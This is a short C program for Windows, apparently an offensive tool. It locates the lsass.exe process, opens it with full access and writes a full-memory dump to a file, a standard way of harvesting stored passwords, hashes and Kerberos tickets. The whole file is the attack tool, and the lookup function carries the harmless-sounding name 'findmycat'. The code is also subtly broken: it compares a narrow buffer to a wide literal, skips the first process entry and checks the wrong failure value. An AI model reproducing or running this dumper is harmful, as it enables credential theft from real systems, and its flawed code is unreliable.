#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <Dbghelp.h>

int findmycat() {
    int pid = NULL;
    HANDLE hSnapshot;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    BOOL first = Process32First(hSnapshot, &entry);

    while (Process32Next(hSnapshot, &entry)) {
        if (strcmp(entry.szExeFile, L"lsass.exe") == 0) {
            pid = entry.th32ProcessID;
        }
    }
   
    return pid;


}


HANDLE getHandle(int pid) {

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    printf("Process ID ID is %d \n", pid);
    return hProc;

}

int main() {

    int lsid = findmycat();
    HANDLE out = CreateFileW(L"mydump.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hLsass = getHandle(lsid);
    if (hLsass != INVALID_HANDLE_VALUE) {
        printf("Dumping LSASS!");
        MiniDumpWriteDump(hLsass, lsid, out, MiniDumpWithFullMemory, NULL, NULL, NULL);

    }
    else {

        printf("Error: %d", GetLastError());

    }



    return 0;
}
